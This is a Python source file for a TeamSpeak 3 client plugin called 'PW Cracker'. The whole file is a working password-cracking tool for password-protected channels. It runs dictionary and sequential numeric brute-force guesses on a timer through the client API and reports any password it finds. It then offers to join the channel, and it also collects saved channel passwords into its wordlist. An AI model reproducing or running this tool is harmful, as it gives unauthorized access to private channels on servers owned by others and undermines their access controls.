import pytson, ts3lib, ts3defines, os
from pluginhost import PluginHost
from ts3plugin import ts3plugin
from datetime import datetime
from PythonQt.QtGui import QInputDialog, QWidget, QMessageBox, QDialog
from PythonQt.QtCore import Qt, QTimer


def channelURL(schid=None, cid=0, name=None):
    if schid == None:
        try: schid = ts3lib.getCurrentServerConnectionHandlerID()
        except: pass
    if name == None:
        try: (error, name) = ts3lib.getChannelVariable(schid, cid, ts3defines.ChannelProperties.CHANNEL_NAME)
        except: name = cid
    return '[b][url=channelid://{0}]"{1}"[/url][/b]'.format(cid, name)
def clientURL(schid=None, clid=0, uid=None, nickname=None):
    if schid == None:
        try: schid = ts3lib.getCurrentServerConnectionHandlerID()
        except: pass
    if uid == None:
        try: (error, uid) = ts3lib.getClientVariable(schid, clid, ts3defines.ClientProperties.CLIENT_UNIQUE_IDENTIFIER)
        except: pass
    if nickname == None:
        try: (error, nickname) = ts3lib.getClientVariable(schid, clid, ts3defines.ClientProperties.CLIENT_NICKNAME)
        except: nickname = uid
    return '[url=client://{0}/{1}]{2}[/url]'.format(clid, uid, nickname)


def inputBox(title, text):
    x = QWidget()
    x.setAttribute(Qt.WA_DeleteOnClose)
    return QInputDialog.getText(x, title, text)


def msgBox(text, icon=QMessageBox.Information):
    x = QMessageBox()
    x.setText(text)
    x.setIcon(icon)
    x.exec()


def confirm(title, message):
    x = QDialog()
    x.setAttribute(Qt.WA_DeleteOnClose)
    _x = QMessageBox.question(x, title, message, QMessageBox.Yes, QMessageBox.No)
    if _x == QMessageBox.Yes: return True if _x == QMessageBox.Yes else False


class passwordCracker(ts3plugin):
    name = "PW Cracker"
    apiVersion = 22
    requestAutoload = True
    version = "1.0"
    author = "Bluscream"
    description = "<insert lenny face here>"
    offersConfigure = False
    commandKeyword = ""
    infoTitle = "[b]PW Cracker[/b]"
    menuItems = [
        (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 0, "== {0} ==".format(name), ""),
        (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 1, "Stop Cracker", ""),
        (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 2, "Add PW to cracker", ""),
        (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 3, "== {0} ==".format(name), ""),
        (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL, 0, "== {0} ==".format(name), ""),
        (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL, 1, "Crack PW (Dictionary)", ""),
        (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL, 2, "Crack PW (Bruteforce)", ""),
        (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL, 3, "Add PW to cracker", ""),
        (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL, 4, "== {0} ==".format(name), "")
    ]
    hotkeys = []
    debug = False
    pwpath = os.path.join(pytson.getPluginPath(), "scripts", __name__, "pws.txt")
    schid = 0
    cid = 0
    pws = []
    pwc = 0
    timer = QTimer()
    interval = 250
    retcode = ""
    mode = 0

    @staticmethod
    def timestamp(): return '[{:%Y-%m-%d %H:%M:%S}] '.format(datetime.now())

    def __init__(self):
        content = []
        with open(self.pwpath) as f:
            content = f.readlines()
        self.pws = [x.strip() for x in content]
        self.timer.timeout.connect(self.tick)
        if self.debug: ts3lib.printMessageToCurrentTab("{0}[color=orange]{1}[/color] Plugin for pyTSon by [url=https://github.com/{2}]{2}[/url] loaded.".format(self.timestamp(),self.name,self.author))

    def menuCreated(self):
        pass
        # ts3lib.setPluginMenuEnabled(PluginHost.globalMenuID(self, ), False)
        # ts3lib.setPluginMenuEnabled(0, False)

    def startTimer(self, schid, cid):
        (err, haspw) = ts3lib.getChannelVariable(schid, cid, ts3defines.ChannelProperties.CHANNEL_FLAG_PASSWORD)
        if not haspw:
            (err, name) = ts3lib.getChannelVariable(schid, cid, ts3defines.ChannelProperties.CHANNEL_NAME)
            msgBox("Channel \"{0}\" has no password to crack!".format(name), QMessageBox.Warning);return
        self.schid = schid
        self.cid = cid
        self.timer.start(self.interval)
        ts3lib.printMessageToCurrentTab('Timer started!')

    def onMenuItemEvent(self, schid, atype, menuItemID, selectedItemID):
        if atype == ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL:
            if menuItemID == 1:
                self.mode = 0
                self.startTimer(schid, selectedItemID)
            elif menuItemID == 2:
                self.mode = 1
                self.startTimer(schid, selectedItemID)
            elif menuItemID == 3:
                (err, path, pw) = ts3lib.getChannelConnectInfo(schid, selectedItemID)
                if pw == None or pw == False or pw == "":
                    (err, name) = ts3lib.getChannelVariable(schid, selectedItemID, ts3defines.ChannelProperties.CHANNEL_NAME)
                    msgBox('No password saved for channel {0}'.format(name));return
                self.pws.append(pw)
                with open(self.pwpath, "a") as myfile:
                    myfile.write('\n{0}'.format(pw))
                msgBox("Added \"{0}\" to password db".format(pw))
        elif atype == ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL:
            if menuItemID == 1:
                self.timer.stop()
                ts3lib.printMessageToCurrentTab('Timer stopped!')
            elif menuItemID == 2:
                pw = inputBox("Enter Channel Password to add", "Password:")
                if pw == None or pw == False or pw == "":
                    msgBox("Not adding \"{0}\" to password db".format(pw), QMessageBox.Warning);return
                elif pw in self.pws:
                    msgBox("Not adding \"{0}\" to password db\n\nIt already exists!".format(pw), QMessageBox.Warning);return
                self.pws.append(pw)
                with open(self.pwpath, "a") as myfile:
                    myfile.write('\n{0}'.format(pw))
                msgBox("Added \"{0}\" to password db".format(pw))

    def infoData(self, schid, id, atype):
        if not atype == ts3defines.PluginItemType.PLUGIN_CHANNEL: return None
        if not self.cid == id: return None
        if not self.schid == schid: return None
        if self.mode == 0: msg = "Trying {0} / {1}".format(self.pwc, len(self.pws))
        elif self.mode == 1: msg = "Trying {0}".format(self.pwc)
        return [msg]

    def tick(self):
        try:
            self.retcode = ts3lib.createReturnCode()
            if self.mode == 0:
                if self.pwc >= len(self.pws):
                    self.timer.stop()
                    (err, name) = ts3lib.getChannelVariable(self.schid, self.cid, ts3defines.ChannelProperties.CHANNEL_NAME)
                    msgBox("Password for channel \"{0}\" was not found :(\n\nTried {1} passwords.".format(name, self.pwc+1))
                    self.schid = 0;self.cid = 0;self.pwc = 0;return
                pw = self.pws[self.pwc]
            elif self.mode == 1: pw = str(self.pwc)
            err = ts3lib.verifyChannelPassword(self.schid, self.cid, pw, self.retcode)
            if err != ts3defines.ERROR_ok:
                (er, msg) = ts3lib.getErrorMessage(err)
                print('ERROR {0} ({1}) while trying password \"{2}\" for channel #{3} on server #{4}'.format(msg, err, pw, self.cid, self.schid))
            else: print('[{0}] Trying password \"{1}\" for channel #{2} on server #{3}'.format(self.pwc, pw, self.cid, self.schid))
            self.pwc += 1
        except: from traceback import format_exc;ts3lib.logMessage(format_exc(), ts3defines.LogLevel.LogLevel_ERROR, "pyTSon", 0)

    def onServerErrorEvent(self, schid, errorMessage, error, returnCode, extraMessage):
        if not returnCode == self.retcode: return
        ts3lib.requestInfoUpdate(schid, ts3defines.PluginItemType.PLUGIN_CHANNEL, self.cid)
        if not error == ts3defines.ERROR_ok: return 1
        self.timer.stop()
        (err, name) = ts3lib.getChannelVariable(schid, self.cid, ts3defines.ChannelProperties.CHANNEL_NAME)
        ts3lib.printMessageToCurrentTab('Channel: {0} Password: \"{1}\"'.format(channelURL(schid, self.cid, name), self.pws[self.pwc-1] if self.mode == 0 else self.pwc-1))
        if confirm("Password found! ({0} / {1})".format(self.pwc, len(self.pws)) if self.mode == 0 else "Password found!",
                   "Password \"{0}\" was found for channel \"{1}\"\n\nDo you want to join now?".format(self.pws[self.pwc-1] if self.mode == 0 else self.pwc-1,name)):
            (err, ownID) = ts3lib.getClientID(schid)
            ts3lib.requestClientMove(schid, ownID, self.cid, self.pws[self.pwc-1] if self.mode == 0 else str(self.pwc-1))
        self.schid = 0;self.cid = 0;self.pwc = 0
        ts3lib.requestInfoUpdate(schid, ts3defines.PluginItemType.PLUGIN_CHANNEL, self.cid)
        return 1

    def onClientMoveEvent(self, schid, clientID, oldChannelID, newChannelID, visibility, moveMessage):
        pass

    def onUpdateChannelEditedEvent(self, schid, channelID, invokerID, invokerName, invokerUniqueIdentiﬁer):
        if not self.cid == channelID: return
        if not self.schid == schid: return
        (err, haspw) = ts3lib.getChannelVariable(schid, channelID, ts3defines.ChannelProperties.CHANNEL_FLAG_PASSWORD)
        if haspw: return
        self.timer.stop()
        (err, name) = ts3lib.getChannelVariable(schid, channelID, ts3defines.ChannelProperties.CHANNEL_NAME)
        if confirm("Password removed", "Password was removed from channel \"{0}\" by \"{1}\"\n\nDo you want to join now?".format(name, invokerName)):
            (err, ownID) = ts3lib.getClientID(self.schid)
            ts3lib.requestClientMove(schid, ownID, channelID, "")
        self.schid = 0;self.cid = 0;self.pwc = 0

    def onDelChannelEvent(self, schid, channelID, invokerID, invokerName, invokerUniqueIdentiﬁer):
        if not self.cid == channelID: return
        if not self.schid == schid: return
        self.timer.stop()
        msgBox("Channel #{0} got deleted by \"{1}\"\n\nStopping Cracker!".format(self.cid, invokerName), QMessageBox.Warning)
        self.schid = 0;self.cid = 0;self.pwc = 0

    def onConnectStatusChangeEvent(self, schid, newStatus, errorNumber):
        if not newStatus == ts3defines.ConnectStatus.STATUS_DISCONNECTED: return
        if not self.schid == schid: return
        self.timer.stop()
        (err, name) = ts3lib.getChannelVariable(schid, self.cid, ts3defines.ChannelProperties.CHANNEL_NAME)
        msgBox("Server left\n\nStopping Cracker!", QMessageBox.Warning)
        self.schid = 0;self.cid = 0;self.pwc = 0
